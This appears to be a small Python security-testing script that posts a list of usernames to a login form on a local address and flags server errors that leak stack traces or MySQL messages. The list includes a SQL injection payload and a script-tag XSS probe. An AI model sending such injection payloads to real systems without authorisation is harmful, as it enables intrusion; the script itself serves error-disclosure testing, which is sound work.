import requests
import re

# target URL
url = 'http://127.0.0.1:5000/'

# list of usernames to test, including dangerous inputs
common_usernames = [
    'admin', 'user', 'test', 'guest', 'root', 'select * from users',
    '<script>alert(1)</script>', 'admin\' OR 1=1 --'
]

# regex pattern to detect stack traces or detailed error messages
STACK_TRACE_PATTERN = re.compile(r'Traceback \(most recent call last\):|File \".*\", line \d+, in|_mysql_connector.MySQLInterfaceError|mysql.connector.errors.ProgrammingError')

# Loop through each username and attempt to log in
for username in common_usernames:
    response = requests.post(url, data={'username': username, 'password': ''})
    
    # Check if the response contains a stack trace or detailed error message
    if response.status_code == 500 and STACK_TRACE_PATTERN.search(response.text):
        print(f'Success! Discovered unusual error with username: {username}')
        print(response.text)

    else:
         print(f'Normal behavior with username: {username}')
        
        